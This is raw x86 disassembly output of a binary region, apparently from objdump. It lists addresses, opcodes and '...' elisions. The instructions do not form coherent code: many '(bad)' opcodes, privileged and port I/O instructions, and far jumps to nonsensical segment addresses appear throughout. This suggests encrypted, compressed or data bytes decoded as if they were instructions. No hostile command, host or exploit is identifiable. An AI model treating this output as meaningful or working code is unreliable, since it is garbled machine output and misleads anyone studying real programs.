  41286e:	ins    DWORD PTR es:[edi],dx
  41286f:	test   al,0x17
  412871:	add    cl,ch
  412873:	xor    DWORD PTR [ebp-0x50],0x7c
  412877:	cld    
  412878:	jmp    0xe874:0x88028a56
  41287f:	add    ecx,DWORD PTR ds:0xfbc3701
  412885:	add    DWORD PTR [edi-0x38c0f13d],ebx
  41288b:	sti    
  41288c:	pop    ss
  41288d:	dec    eax
  41288e:	arpl   di,si
  412890:	add    eax,0x85581b87
  412895:	sub    DWORD PTR [ebx+eax*1+0xd],0xfeba0200
  41289d:	rcr    edi,cl
  41289f:	dec    edx
  4128a0:	rcl    BYTE PTR [edi],1
  4128a2:	call   0x924135aa
  4128a7:	and    DWORD PTR [esi-0x2b81133a],edx
  4128ad:	jnp    0x4128ed
  4128af:	hlt    
  4128b0:	daa    
  4128b1:	mov    ch,0x94
  4128b3:	jle    0x4128d3
  4128b5:	jo     0x412926
  4128b7:	test   DWORD PTR [eax],0x0
	...
  4128d5:	add    BYTE PTR [edx-0x69ffe985],dl
  4128db:	inc    ebx
  4128dc:	inc    ecx
  4128de:	(bad)  
  4128df:	out    0x88,eax
  4128e1:	and    eax,0xb48b0353
  4128e6:	bound  edi,QWORD PTR [ebx+eax*1-0x10]
  4128ea:	adc    ebp,eax
  4128ec:	(bad)  
  4128ee:	add    al,0x83
  4128f0:	mov    edi,0xfc431eb
  4128f5:	jb     0x41291b
  4128f7:	jae    0x4128f8
  4128f9:	call   0xbe12ae0c
  4128fe:	or     DWORD PTR [ecx],ecx
  412900:	dec    edx
  412901:	in     eax,0xb5
  412903:	adc    ecx,DWORD PTR [ebx-0x7701f4dd]
  412909:	outs   dx,DWORD PTR ds:[esi]
  41290a:	cli    
  41290b:	dec    esi
  41290c:	(bad)  
  41290d:	jmp    0x2850ef0d
  412912:	out    dx,al
  412913:	add    BYTE PTR [eax+0x6],dl
  412916:	inc    edi
  412917:	sti    
  412918:	(bad)  
  412919:	ja     0x41297d
  41291b:	dec    esi
  41291c:	adc    al,0xa5
  41291e:	push   esp
  41291f:	verr   WORD PTR [edx+0x47]
  412923:	repz mov ah,BYTE PTR [esi+0x49]
  412927:	js     0x41296d
  412929:	stc    
  41292a:	rol    ebx,0xe7
  41292d:	push   0xffffffc5
  41292f:	cli    
  412930:	mov    BYTE PTR [ecx+eiz*1],ah
  412933:	pop    eax
  412934:	xchg   BYTE PTR [edi+0x248a4dbc],bh
	...
  412956:	add    BYTE PTR [eax],al
  412958:	and    eax,0x981c3ecf
  41295d:	mov    ebx,0xf75260e7
  412962:	push   cs
  412963:	ins    DWORD PTR es:[edi],dx
  412964:	out    dx,eax
  412965:	dec    edx
  412966:	(bad)  
  412967:	sahf   
  412968:	adc    BYTE PTR [ebp-0x1c6d1911],ch
  41296e:	sti    
  41296f:	mov    ds,WORD PTR [edi+ecx*8+0x37]
  412973:	add    BYTE PTR ds:0x9483be5d,dl
  412979:	mov    cl,0x81
  41297b:	shl    dh,0x82
  41297e:	cmp    eax,0x1e476d57
  412983:	(bad)  
  412985:	in     eax,dx
  412986:	adc    al,0x0
  412988:	mov    ah,0xcb
  41298a:	inc    ebx
  41298b:	and    al,0x64
  41298d:	xchg   edx,eax
  41298e:	push   0x1a374300
  412993:	lea    ecx,[ebx-0x1ca9aefd]
  412999:	ss push cs
  41299b:	mov    ebp,edi
  41299d:	mov    al,0x73
  41299f:	or     al,0xe3
  4129a1:	ss push es
  4129a3:	call   0x3ee0d3
  4129a8:	jmp    0x1bc63770
  4129ad:	push   ecx
  4129ae:	(bad)  
  4129af:	call   FWORD PTR [ebp+0x45]
  4129b2:	push   ds
  4129b3:	psubw  mm7,QWORD PTR [ecx+0x18]
  4129b7:	add    BYTE PTR [ebx+ecx*8+0x7b],dh
  4129bb:	adc    al,0x0
	...
  4129d9:	add    BYTE PTR ds:0x64001526,cl
  4129df:	cmp    DWORD PTR [esp+edi*1+0x34],0x36
  4129e4:	pop    es
  4129e5:	cmp    eax,DWORD PTR [edx]
  4129e7:	sub    al,0xd
  4129e9:	test   ch,ah
  4129eb:	pop    ebx
  4129ec:	(bad)  
  4129ed:	call   FWORD PTR [edx+0x45]
  4129f0:	push   ss
  4129f1:	add    ch,al
  4129f3:	sub    eax,0xfcbc4e89
  4129f8:	fdiv   DWORD PTR [ecx+eax*1-0x3]
  4129fc:	pop    ebp
  4129fd:	ins    BYTE PTR es:[edi],dx
  4129fe:	xor    eax,DWORD PTR [esi+0x1f41829]
  412a04:	mov    eax,DWORD PTR [esi+0xc]
  412a07:	test   DWORD PTR [esi+0xb370d74],edi
  412a0d:	fld    DWORD PTR [edx]
  412a0f:	in     eax,0xee
  412a11:	pop    ss
  412a12:	or     eax,0x3dffdc57
  412a17:	out    0x7e,eax
  412a19:	push   ebp
  412a1a:	stc    
  412a1b:	loope  0x412a60
  412a1d:	out    0x78,eax
  412a1f:	fwait
  412a20:	add    al,BYTE PTR [eax]
  412a22:	nop
  412a23:	pop    ss
  412a24:	add    BYTE PTR [ebx+ecx*1-0x59fffc01],al
  412a2b:	add    al,0x7d
  412a2d:	inc    ebp
  412a2e:	adc    DWORD PTR [edx+0x3a],ebx
  412a31:	cmp    al,ah
  412a33:	push   esi
  412a34:	test   dh,dh
  412a36:	cli    
  412a37:	push   esi
  412a38:	add    cl,BYTE PTR [ebx-0x76c3fd3a]
	...
  412a5a:	add    BYTE PTR [eax],al
  412a5c:	cld    
  412a5d:	push   eax
  412a5e:	mov    eax,0x5adc1a2b
  412a63:	push   ss
  412a64:	or     eax,0xcf78357
  412a69:	imul   edi,esi,0xffffff89
  412a6c:	int3   
  412a6d:	push   edi
  412a6e:	or     al,0x46
  412a70:	cmp    BYTE PTR [esi-0x7b],dl
  412a73:	(bad)  
  412a74:	cli    
  412a75:	push   esi
  412a76:	add    al,BYTE PTR [edi+0x64]
  412a79:	mov    ch,0x55
  412a7b:	(bad)  
  412a7c:	push   edx
  412a7d:	xchg   edx,eax
  412a7e:	mov    al,0x67
  412a80:	ss ss jp 0x412a09
  412a84:	xchg   ebp,eax
  412a85:	push   edi
  412a86:	add    al,BYTE PTR [eax]
  412a88:	push   cs
  412a89:	sbb    eax,0x42553adc
  412a8e:	popa   
  412a8f:	mov    al,cl
  412a91:	dec    esi
  412a92:	pop    ecx
  412a93:	loop   0x412ab0
  412a95:	and    al,0xec
  412a97:	add    DWORD PTR [ecx-0x5eb284e5],esp
  412a9d:	push   ecx
  412a9e:	sub    esi,DWORD PTR [edx+0x45]
  412aa1:	add    BYTE PTR [edx-0x3a],dh
  412aa4:	sbb    al,BYTE PTR [ebx-0x25f42758]
  412aaa:	call   0xecf6ac62
  412aaf:	jp     0x412a80
  412ab1:	push   edi
  412ab2:	dec    esi
  412ab3:	or     ecx,DWORD PTR ds:0x877d9200
  412ab9:	(bad)
  412abc:	lds    ecx,FWORD PTR [eax]
  412abe:	nop
  412abf:	inc    DWORD PTR [eax]
	...
  412add:	add    BYTE PTR [ebx+0xd03fd79],dl
  412ae3:	jp     0x412ad6
  412ae5:	or     DWORD PTR [ebx+0x1c],ecx
  412ae8:	out    0x88,al
  412aea:	xor    esi,ebp
  412aec:	call   0xe788b8f4
  412af1:	xlat   BYTE PTR ds:[ebx]
  412af2:	outs   dx,DWORD PTR ds:[esi]
  412af3:	jns    0x412a9e
  412af5:	add    al,0xa6
  412af7:	jb     0x412b62
  412af9:	into   
  412afa:	sar    bh,cl
  412afc:	inc    ecx
  412afd:	jb     0x412a8e
  412aff:	int    0xa8
  412b01:	add    edx,DWORD PTR [edx]
  412b03:	add    DWORD PTR [ebx+0x694c7af6],0xffffffce
  412b0a:	ret    0x93ff
  412b0d:	in     al,0x97
  412b0f:	mov    ebp,0xd3440a94
  412b14:	addr16 jnp 0x412ae7
  412b17:	out    0x6b,eax
  412b19:	inc    esp
  412b1a:	fsubp  st(4),st
  412b1c:	mov    cl,0x2c
  412b1e:	sbb    eax,DWORD PTR [ecx+0x4c42f72f]
  412b24:	push   edx
  412b25:	add    al,0xdd
  412b27:	jp     0x412b67
  412b29:	lock xchg DWORD PTR [eax-0x40],eax
  412b2d:	mov    esp,0x88e8ffe7
  412b32:	(bad)  
  412b33:	cld    
  412b34:	fs pop ss
  412b36:	add    al,BYTE PTR [eax]
  412b38:	add    cl,ch
  412b3a:	mov    bh,0x17
  412b3c:	mov    esp,DWORD PTR [edi]
  412b3e:	std    
  412b3f:	push   ss
  412b40:	enter  0xe2,0x0
	...
  412b60:	xor    edx,edi
  412b62:	xchg   ah,al
  412b64:	add    ecx,DWORD PTR [esi+edi*8+0x63]
  412b68:	test   DWORD PTR [ecx],0x84ebbd4e
  412b6e:	sbb    esi,ebx
  412b70:	push   cs
  412b71:	add    BYTE PTR [ebx+0xbd41181],al
  412b77:	arpl   di,cx
  412b79:	add    BYTE PTR [edx],bh
  412b7b:	daa    
  412b7c:	in     al,dx
  412b7d:	cli    
  412b7e:	test   al,dh
  412b80:	mov    ebx,0xd072fe4b
  412b85:	xlat   BYTE PTR ds:[ebx]
  412b86:	sub    ch,BYTE PTR [edi+0x4e3a58a2]
  412b8c:	pop    ebx
  412b8d:	dec    edx
  412b8e:	cmp    ah,BYTE PTR [edi+0x3481fac2]
  412b94:	mov    al,ds:0xa140fe4b
  412b99:	dec    edx
  412b9a:	(bad)  
  412b9b:	cs pop es
  412b9d:	mov    ebp,0xfa31e26b
  412ba2:	sub    edi,0xffffffcb
  412ba5:	dec    ecx
  412ba6:	(bad)  
  412ba7:	bound  ecx,QWORD PTR [eax-0xd]
  412baa:	test   BYTE PTR [ecx],ch
  412bac:	inc    edx
  412bad:	and    al,0x3b
  412baf:	and    BYTE PTR [edi],bh
  412bb1:	lock imul ebp,ecx,0xd5557c9e
  412bb8:	xlat   BYTE PTR ds:[ebx]
  412bb9:	cmp    eax,0x1413e7
  412bbe:	add    BYTE PTR [ecx+ecx*8-0x2d],ch
  412bc2:	sub    al,0x1a
	...
  412be0:	add    BYTE PTR [eax],al
  412be2:	shl    DWORD PTR [ebp+0x4c],1
  412be5:	in     eax,0xb7
  412be7:	jl     0x412b84
  412be9:	jmp    0x12a2bfc
  412bee:	fistp  DWORD PTR [ecx-0x2]
  412bf1:	call   FWORD PTR [edi+0x6c2b1a41]
  412bf7:	stc    
  412bf8:	fdiv   DWORD PTR [edi-0x2d]
  412bfb:	lds    ecx,FWORD PTR [ecx]
  412bfd:	cmp    bh,BYTE PTR [edx]
  412bff:	and    BYTE PTR [ebp-0x20],dh
  412c02:	addr16 mov esp,0xc8ec73ff
  412c08:	inc    ecx
  412c09:	add    DWORD PTR [esi-0x788ad4bc],edi
  412c0f:	enter  0x6c44,0xbf
  412c13:	inc    esp
  412c14:	sbb    bh,BYTE PTR [ebx]
  412c16:	jl     0x412c4a
  412c18:	(bad)  
  412c19:	jmp    0x3ee620
  412c1e:	out    dx,eax
  412c1f:	cdq    
  412c20:	data16 jne 0x412bd3
  412c23:	out    dx,eax
  412c24:	enter  0xb8eb,0xf7
  412c28:	pop    ebp
  412c29:	js     0x412bee
  412c2b:	add    al,0x8d
  412c2d:	inc    ebx
  412c2e:	dec    ebx
  412c2f:	mov    DWORD PTR [eax+edi*2-0x55],0x2fff4174
  412c37:	mov    dh,BYTE PTR [edx]
  412c39:	lar    eax,WORD PTR [eax]
  412c3c:	or     cl,al
  412c3e:	sbb    eax,0x65e182f8
  412c43:	neg    DWORD PTR [ebp+0x6c]
	...
  412c62:	add    BYTE PTR [eax],al
  412c64:	xchg   esi,eax
  412c65:	pop    esp
  412c66:	mov    DWORD PTR [esi-0x68],eax
  412c69:	cmp    DWORD PTR [esi+0x5cf74774],0x314ce208
  412c73:	shl    BYTE PTR [esi+0x7f5c54c5],cl
  412c79:	ror    BYTE PTR ds:0xfffea78f,0xff
  412c80:	pop    ss
  412c81:	(bad)  
  412c82:	jmp    0x94a33997
  412c87:	add    dl,BYTE PTR [esi+0x5b0f1812]
  412c8d:	pop    esp
  412c8e:	add    cl,al
  412c90:	and    eax,0xcdf7f64
  412c95:	fcomip st,st(3)
  412c97:	inc    esi
  412c98:	lea    ecx,[ebp+0x26147505]
  412c9e:	xor    BYTE PTR [edx],bh
  412ca0:	int3   
  412ca1:	pop    edx
  412ca2:	jbe    0x412c65
  412ca4:	out    0x5a,al
  412ca6:	psrld  mm4,QWORD PTR [esi]
  412ca9:	cwde   
  412caa:	sti    
  412cab:	xchg   esp,eax
  412cac:	iret   
  412cad:	into   
  412cae:	inc    eax
  412caf:	test   ch,cl
  412cb1:	pop    edx
  412cb2:	xchg   bh,bl
  412cb4:	(bad)  
  412cb6:	dec    ebx
  412cb7:	call   0xfe8d070c
  412cbc:	xchg   esi,eax
  412cbd:	cdq    
  412cbe:	jmp    0x39bf:0x853b4b8a
  412cc5:	dec    esi
  412cc6:	pop    es
  412cc7:	fld    DWORD PTR [eax]
	...
  412ce5:	add    BYTE PTR [esi],bl
  412ce7:	sti    
  412ce8:	fcos   
  412cea:	push   edx
  412ceb:	aam    0xb4
  412ced:	sbb    eax,DWORD PTR [esi-0x2b00a4ea]
  412cf3:	push   esi
  412cf4:	add    al,BYTE PTR [ebp+0x21852a4d]
  412cfa:	and    BYTE PTR [edx],0x4c
  412cfd:	jmp    0x1f26:0x1bc4ce30
  412d04:	or     cl,bl
  412d06:	loop   0x412d62
  412d08:	js     0x412d14
  412d0a:	daa    
  412d0b:	xchg   ecx,eax
  412d0c:	push   ds
  412d0d:	jne    0x412d0f
  412d0f:	(bad)  
  412d10:	dec    edx
  412d11:	add    BYTE PTR [edx],al
  412d13:	fild   DWORD PTR [ebx]
  412d15:	dec    DWORD PTR [edx+0x5a]
  412d18:	ja     0x412d5c
  412d1a:	or     al,0x0
  412d1c:	and    eax,edx
  412d1e:	jmp    0x3090921b
  412d23:	dec    ecx
  412d24:	aad    0x7f
  412d26:	dec    edi
  412d27:	mov    ebp,0xf8b6c211
  412d2c:	push   0x65
  412d2e:	sbb    DWORD PTR [ecx-0x43],ecx
  412d31:	jg     0x412cfb
  412d33:	retf   
  412d34:	imul   eax,DWORD PTR [ebx+ebx*1-0x7c],0xffffffc4
  412d39:	dec    edx
  412d3a:	add    ecx,DWORD PTR [ecx-0x1f]
  412d3d:	test   al,0x12
  412d3f:	stc    
  412d40:	data16 das 
  412d42:	lock dec eax
  412d44:	xchg   ebp,eax
  412d45:	pop    ss
  412d46:	aam    0xbe
  412d48:	pop    edi
  412d49:	mov    edx,0x0
	...
  412d66:	add    BYTE PTR [eax],al
  412d68:	inc    esi
  412d69:	add    eax,0x3a88fba8
  412d6e:	jle    0x412dbb
  412d70:	rcl    ebp,cl
  412d72:	jl     0x412d20
  412d74:	mov    ch,0x40
  412d76:	outs   dx,BYTE PTR ds:[esi]
  412d77:	dec    ebx
  412d78:	ret    
  412d79:	add    al,0xc7
  412d7b:	xlat   BYTE PTR ds:[ebx]
  412d7c:	aas    
  412d7d:	das    
  412d7e:	in     eax,dx
  412d7f:	xchg   ecx,eax
  412d80:	pcmpeqw mm4,QWORD PTR [esi-0x1badb1f1]
  412d87:	sti    
  412d88:	push   cs
  412d89:	push   edi
  412d8a:	dec    ebx
  412d8b:	dec    edx
  412d8c:	fwait
  412d8d:	dec    eax
  412d8e:	add    DWORD PTR [edx-0x48b32da],ebp
  412d94:	sar    ah,0x61
  412d97:	mov    edx,0x1ebd3e
  412d9c:	add    eax,0x947fee04
  412da1:	dec    ecx
  412da2:	adc    eax,0xb80754b
  412da7:	dec    ebx
  412da8:	arpl   WORD PTR [edi+eiz*4],ax
  412dab:	xlat   BYTE PTR ds:[ebx]
  412dac:	fistp  WORD PTR [esi+0x750f91ed]
  412db2:	jmp    DWORD PTR [esi-0x1a0a42e6]
  412db8:	inc    esi
  412db9:	(bad)  
  412dba:	call   0xfe8af25b
  412dbf:	and    ah,BYTE PTR [edi-0x2c]
  412dc2:	jb     0x412e29
  412dc4:	daa    
  412dc5:	xchg   edx,eax
  412dc6:	add    ah,BYTE PTR [edx+0x64]
  412dc9:	or     al,0x43
  412dcb:	mov    edi,0x0
	...
  412de8:	add    BYTE PTR [eax],al
  412dea:	sbb    al,BYTE PTR [eax]
  412dec:	add    edx,edx
  412dee:	aam    0x5
  412df0:	pop    esi
  412df1:	inc    ebp
  412df2:	push   es
  412df3:	xor    DWORD PTR [ebp-0x52],0x57
  412df7:	inc    esi
  412df8:	push   cs
  412df9:	pop    edi
  412dfa:	adc    edi,DWORD PTR [ebx+0x4d]
  412dfd:	aad    0xcb
  412dff:	dec    ebp
  412e00:	add    esp,ecx
  412e02:	ficomp WORD PTR [eax-0x77]
  412e05:	(bad)  
  412e06:	push   edi
  412e07:	inc    esi
  412e08:	cmp    ah,BYTE PTR [edi]
  412e0a:	mov    ch,0xf6
  412e0c:	sbb    BYTE PTR [esi+eax*2],0x46
  412e10:	(bad)  
  412e11:	out    0x9c,al
  412e13:	add    cl,BYTE PTR [ebx-0xa3ce2e1]
  412e19:	in     eax,dx
  412e1a:	mov    dh,0xf7
  412e1c:	jmp    0xf812:0x6bb5337e
  412e23:	cmc    
  412e24:	and    BYTE PTR [edi+edx*2+0x7cf6fe46],0x2
  412e2c:	inc    ebx
  412e2d:	push   0x46
  412e2f:	stc    
  412e30:	push   cs
  412e31:	ins    DWORD PTR es:[edi],dx
  412e32:	jns    0x412e78
  412e34:	(bad)  
  412e35:	xchg   DWORD PTR cs:[ebp+0x20],edi
  412e39:	daa    
  412e3a:	mov    DWORD PTR [ebp-0x7e],0x21cd7a21
  412e41:	push   0xffffffd6
  412e43:	repz jae 0x412e02
  412e46:	adc    eax,0x64ffff7d
  412e4b:	add    esi,DWORD PTR [esi+edx*1+0x0]
	...
  412e6b:	add    BYTE PTR [ecx+0x34002022],dl
  412e71:	dec    edx
  412e72:	test   BYTE PTR ds:0x3dfdb932,al
  412e78:	sbb    eax,0x2300001c
  412e7d:	cmp    al,0xfd
  412e80:	inc    ebx
  412e81:	mov    ecx,0x41fdc031
  412e86:	pop    esi
  412e87:	pop    gs
  412e89:	mov    dl,0xfb
  412e8b:	call   DWORD PTR [ebx-0x55]
  412e8e:	(bad)  
  412e90:	ret    
  412e91:	mov    eax,0x7be3d939
  412e96:	sar    ah,cl
  412e98:	mov    bl,0xb8
  412e9a:	jle    0x412ed7
  412e9c:	inc    BYTE PTR [edi-0x7d]
  412e9f:	retf   
  412ea0:	cmp    BYTE PTR [eax+0x68d43fd],0xfb
  412ea7:	call   DWORD PTR [ebx-0x1c93a20c]
  412ead:	jnp    0x412e88
  412eaf:	inc    BYTE PTR [ebx-0x47]
  412eb2:	or     eax,0xc79b7b6
  412eb7:	sbb    BYTE PTR [edx+eax*1+0x30e53b43],ah
  412ebe:	sub    ecx,DWORD PTR [edi]
  412ec0:	cmp    BYTE PTR [ecx-0x5],dh
  412ec3:	call   DWORD PTR [ebx+0x7d]
  412ec6:	test   BYTE PTR [ecx],0xa3
  412ec9:	(bad)  
  412eca:	lods   al,BYTE PTR ds:[esi]
  412ecb:	std    
  412ecc:	sar    DWORD PTR [eax+0xf881],cl
	...
  412eee:	adc    al,0x49
  412ef0:	and    BYTE PTR [ebp+0x3dfdb931],0xc4
  412ef7:	sti    
  412ef8:	(bad)  
  412ef9:	jmp    DWORD PTR [ebx-0x3a]
  412efc:	cwde   
  412efd:	std    
  412efe:	or     eax,0x8d3c48ee
  412f03:	dec    esi
  412f04:	add    al,BYTE PTR [eax]
  412f06:	fs dec eax
  412f08:	dec    eax
  412f09:	(bad)  
  412f0a:	push   edx
  412f0b:	add    DWORD PTR [edx],0x20
  412f0e:	or     eax,0xba81f759
  412f13:	push   esp
  412f14:	inc    edi
  412f15:	(bad)  
  412f16:	clc    
  412f17:	push   edx
  412f18:	and    al,BYTE PTR [eax]
  412f1a:	or     eax,0x28798056
  412f1f:	sub    eax,0xf8f23c47
  412f24:	add    eax,DWORD PTR [eax]
  412f26:	or     dl,ch
  412f28:	xlat   BYTE PTR ds:[ebx]
  412f29:	cld    
  412f2a:	adc    al,BYTE PTR [ebp+0x572d5f05]
  412f30:	add    cl,BYTE PTR [edi]
  412f32:	mov    DWORD PTR [ebx+0x5cfafe46],edi
  412f38:	add    dh,BYTE PTR [eax]
  412f3a:	or     eax,0xebb95957
  412f3f:	outs   dx,BYTE PTR ds:[esi]
  412f40:	inc    edi
  412f41:	cmp    al,BYTE PTR [ebx+0x43]
  412f44:	test   DWORD PTR [edx-0x1b88291],0xb9040d02
  412f4e:	sbb    ebp,DWORD PTR [edi]
  412f50:	add    al,BYTE PTR [eax]
	...
  412f6e:	add    BYTE PTR [eax],al
  412f70:	dec    esi
  412f71:	xchg   edx,eax
  412f72:	inc    ecx
  412f73:	jbe    0x412f5d
  412f75:	dec    ebp
  412f76:	jle    0x412fa7
  412f78:	mov    cl,0xa6
  412f7a:	inc    edi
  412f7b:	and    BYTE PTR [ebp-0x157c08a0],0xb2
  412f82:	inc    edi
  412f83:	dec    BYTE PTR [esi-0x76f0dd41]
  412f89:	and    eax,0x4c8afe46
  412f8e:	mov    ds:0xf75782ff,al
  412f93:	sbb    DWORD PTR [esi],0x0
  412f96:	and    eax,0x69037348
  412f9b:	icebp  
  412f9c:	push   0x45
  412f9e:	push   DWORD PTR [esi+0x60d4561]
  412fa4:	or     eax,0x203e920
  412fa9:	sub    ah,0x46
  412fac:	dec    ebx
  412fad:	inc    ebp
  412fae:	mov    bl,0xfd
  412fb0:	and    al,BYTE PTR [eax]
  412fb2:	jmp    0xe192c0af
  412fb7:	inc    edi
  412fb8:	xor    eax,DWORD PTR [ebx]
  412fba:	push   cs
  412fbb:	and    al,0xd
  412fbd:	add    dh,ah
  412fbf:	jg     0x412feb
  412fc1:	dec    ecx
  412fc2:	int    0x47
  412fc4:	fldenv [eax+ecx*1+0x64f50d04]
  412fcb:	sub    DWORD PTR [edi],eax
  412fcd:	inc    ebp
  412fce:	mov    ch,0x9
  412fd0:	or     eax,0x3e910
	...
  412ff1:	add    ah,ah
  412ff3:	in     eax,dx
  412ff4:	mov    ds:0x3f08f347,eax
  412ff9:	fcomp  DWORD PTR [ebx]
  412ffb:	cmp    DWORD PTR [edi+0x49],0x8ddd44e3
  413002:	xadd   DWORD PTR [ecx+0x4c],ebp
  413006:	add    al,0xf5
  413008:	push   0xffffff89
  41300a:	mov    DWORD PTR [ebp+esi*2-0x7d],0x7dddf2ba
  413012:	int3   
  413013:	inc    ebx
  413014:	gs inc edi
  413016:	icebp  
  413017:	jp     0x413001
  413019:	add    ecx,DWORD PTR ds:0xa68f6cf5
  41301f:	inc    esp
  413020:	dec    ebp
  413021:	or     edx,esi
  413023:	pop    ds
  413024:	jmp    0x5ebf322c
  413029:	dec    ebx
  41302a:	mov    eax,DWORD PTR [edi+edi*8-0xd]
  41302e:	and    DWORD PTR [eax],esp
  413030:	add    cl,ch
  413032:	cmp    DWORD PTR [edx-0x60],0x25
  413036:	retf   0xe845
  413039:	outs   dx,DWORD PTR ds:[esi]
  41303a:	(bad)  
  41303b:	inc    ebp
  41303c:	(bad)  
  41303d:	shr    BYTE PTR [eax-0x5295f128],cl
  413043:	inc    ebx
  413044:	inc    BYTE PTR [esi]
  413046:	pop    edx
  413047:	mov    al,BYTE PTR [edx]
  413049:	stos   BYTE PTR es:[edi],al
  41304a:	(bad)  
  41304b:	dec    esp
  41304c:	or     esi,esp
  41304e:	mov    WORD PTR [edx-0x5],?
  413051:	out    dx,al
  413052:	rol    DWORD PTR [ecx+0xf4f7],cl
	...
  413074:	cmp    edi,DWORD PTR [edx+0x6e]
  413077:	loop   0x41304c
  413079:	inc    ebp
  41307a:	cmp    al,0x6c
  41307c:	push   cs
  41307d:	add    BYTE PTR [eax],al
  41307f:	ficomp WORD PTR [edx-0x34390520]
  413085:	add    esp,DWORD PTR [edi]
  413087:	or     DWORD PTR [ecx],edx
  413089:	add    BYTE PTR [edi],cl
  41308b:	outs   dx,DWORD PTR ds:[esi]
  41308c:	jecxz  0x4130d5
  41308e:	(bad)  
  41308f:	scas   al,BYTE PTR es:[edi]
  413090:	add    eax,0xee92019
  413095:	xrelease xchg BYTE PTR ds:0x80fe4255,bh
  41309c:	mov    eax,ds:0xe38efe46
  4130a1:	lea    eax,[esi-0x18]
  4130a4:	fisttp DWORD PTR [ebp+0x2351eb4e]
  4130aa:	pop    es
  4130ab:	loop   0x4130f6
  4130ad:	(bad)  
  4130ae:	mov    edi,0x88fdfb6a
  4130b3:	lods   al,BYTE PTR ds:[esi]
  4130b4:	pop    esi
  4130b5:	push   es
  4130b6:	inc    ebp
  4130b7:	stc    
  4130b8:	aad    0xee
  4130ba:	mov    ah,BYTE PTR [edi+0x6803749a]
  4130c0:	pop    ss
  4130c1:	sti    
  4130c2:	test   BYTE PTR [eax],al
  4130c4:	fnsave [esi]
  4130c6:	add    eax,0x2943a48b
  4130cb:	ror    edi,1
  4130cd:	inc    edi
  4130ce:	xor    edx,edx
  4130d0:	jge    0x413067
  4130d2:	inc    esi
  4130d3:	jne    0x413137
  4130d5:	(bad)  
  4130d6:	push   esp
  4130d7:	ins    BYTE PTR es:[edi],dx
	...
  4130f4:	add    BYTE PTR [eax],al
  4130f6:	aas    
  4130f7:	push   cs
  4130f8:	inc    ecx
  4130f9:	mov    dh,BYTE PTR [ebx-0x3c]
  4130fc:	push   ebx
  4130fd:	hlt    
  4130fe:	dec    eax
  4130ff:	test   DWORD PTR ds:0xffff2e82,ecx
  413105:	dec    DWORD PTR [eax+0x78447486]
  41310b:	mov    BYTE PTR ds:0xffff1a87,cl
  413111:	(bad)  
  413112:	cmp    esi,DWORD PTR [ebp+0x55]
  413115:	add    al,0x7
  413117:	pop    es
  413118:	cmp    ecx,DWORD PTR [ebp+0x2b]
  41311b:	jne    0x413162
  41311d:	add    bh,BYTE PTR [ebx]
  41311f:	sar    DWORD PTR [edi+0xda7d989],cl
  413125:	mov    dh,0x3b
  413127:	inc    eax
  413129:	loope  0x413117
  41312b:	inc    edi
  41312c:	(bad)  
  41312d:	jb     0x850232b8
  413133:	inc    ebx
  413134:	or     edx,eax
  413136:	pop    ebp
  413137:	mov    edi,edx
  413139:	mov    DWORD PTR [ecx],esi
  41313b:	mov    ah,0x73
  41313d:	or     BYTE PTR [edi*4-0x38f40003],bh
  413144:	inc    ebx
  413145:	clc    
  413146:	aas    
  413147:	xchg   ebx,eax
  413148:	repnz xor DWORD PTR [ebx+0x42],0xffffffe9
  41314d:	sub    eax,0x8dbe74db
  413152:	jl     0x4131cc
  413154:	and    ecx,0xec4bc5b5
	...
  413176:	add    BYTE PTR [eax],al
  413178:	or     eax,0xbf87845a
  41317d:	es ret 0x3ff
  413181:	jnp    0x413106
  413183:	fcos   
  413185:	cwde   
  413186:	add    al,BYTE PTR [edi-0x6c]
  413189:	fwait
  41318a:	inc    esi
  41318b:	mov    al,dl
  41318d:	adc    BYTE PTR [edi-0x41],bh
  413190:	clc    
  413191:	push   eax
  413192:	mov    bh,dh
  413194:	push   0xffffffe1
  413196:	les    ecx,FWORD PTR [eax-0x2e810f38]
  41319c:	or     bl,ch
  41319e:	sbb    dh,al
  4131a0:	push   edx
  4131a1:	stc    
  4131a2:	adc    dl,dl
  4131a4:	iret   
  4131a5:	iret   
  4131a6:	scas   al,BYTE PTR es:[edi]
  4131a7:	adc    eax,DWORD PTR [esi]
  4131a9:	pop    ds
  4131aa:	enter  0x3a2d,0xcb
  4131ae:	jmp    0x1d74:0x4324d88a
  4131b5:	int    0x3c
  4131b7:	mov    dl,BYTE PTR [esi+0x40]
  4131ba:	fsubr  st,st(6)
  4131bc:	sbb    dh,BYTE PTR [ecx]
  4131be:	jge    0x41317f
  4131c0:	add    dl,ch
  4131c2:	int    0x14
  4131c4:	or     eax,0xf95cff57
  4131c9:	mov    bh,BYTE PTR [ebp-0xfe379ed]
  4131cf:	cmp    cl,BYTE PTR [eax-0x65]
  4131d2:	(bad)  
  4131d3:	xlat   BYTE PTR ds:[ebx]
  4131d4:	xchg   esi,eax
  4131d5:	adc    al,0x48
  4131d7:	mov    cl,BYTE PTR [eax+0x6f]
  4131da:	pop    es
  4131db:	enter  0x0,0x0
	...
  4131f7:	add    BYTE PTR [eax],al
  4131f9:	add    BYTE PTR [edx],cl
  4131fb:	fistp  DWORD PTR [ecx-0x12]
  4131fe:	sar    BYTE PTR [edx+0x7f],cl
  413201:	jl     0x4131bc
  413203:	push   edi
  413204:	repz add DWORD PTR [eax-0x79fffddd],0x1c
  41320c:	dec    eax
  41320d:	mov    BYTE PTR [eax+0x0],cl
  413210:	std    
  413211:	js     0x413264
  413213:	sbb    al,0xa9
  413215:	jp     0x413260
  413217:	sbb    al,0xb9
  413219:	pop    edx
  41321a:	nop
  41321b:	in     al,dx
  41321c:	call   0xe10cc424
  413221:	js     0x413204
  413223:	dec    ebx
  413224:	cmp    eax,0x2e7572ce
  413229:	js     0x413272
  41322b:	pop    eax
  41322c:	aad    0x54
  41322e:	jae    0x413271
  413230:	imul   eax,DWORD PTR [ebx+0x1b],0x7c
  413234:	retf   0x62ee
  413237:	inc    ecx
  413238:	jmp    0x429890e3
  41323d:	push   esp
  41323e:	push   ebx
  41323f:	inc    ecx
  413240:	jae    0x4131fe
  413242:	or     eax,0x9422257d
  413247:	mov    ebx,0x41378fc
  41324c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41324d:	shl    DWORD PTR [ecx-0x1645cdfd],1
  413253:	add    ebp,DWORD PTR [ebx+edi*4]
  413256:	test   eax,0xedb9ef0
  41325b:	or     eax,0xa0
	...
  41327c:	shl    al,0x7e
  41327f:	retf   
  413280:	or     al,0xf1
  413282:	push   esp
  413283:	inc    ebp
  413284:	xchg   ebp,eax
  413285:	mov    dl,0xc4
  413287:	adc    eax,ebx
